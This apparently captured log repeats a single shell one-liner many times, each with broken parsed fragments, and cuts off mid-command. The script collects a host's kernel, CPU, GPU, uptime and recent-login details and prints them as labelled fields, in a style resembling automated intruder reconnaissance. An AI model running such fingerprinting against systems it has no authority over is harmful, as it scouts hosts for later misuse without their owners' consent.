"UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep 